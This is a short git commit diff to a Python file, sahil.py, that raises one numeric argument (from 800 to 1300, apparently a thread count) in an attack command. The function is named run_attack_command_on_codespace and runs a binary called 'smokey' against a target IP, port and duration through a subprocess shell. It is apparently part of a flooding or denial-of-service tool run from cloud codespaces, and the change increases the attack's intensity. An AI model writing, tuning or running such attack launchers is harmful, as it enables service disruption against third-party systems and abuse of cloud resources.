e7aed5b09ac6f0052379b359c54f4fd2b9ec87fa
badal006 <bhaigundahaimarea@gmail.com>
2025-05-19 23:02:37 +0530

    Update sahil.py

--- sahil.py
+++ sahil.py
@@ -31,7 +31,7 @@ CREATOR = "This File Is Made By @SahilModzOwner"  #DON'T CHANGE THIS WARNA ERROR
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./smokey {target_ip} {target_port} {duration} 800"
+    command = f"./smokey {target_ip} {target_port} {duration} 1300"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
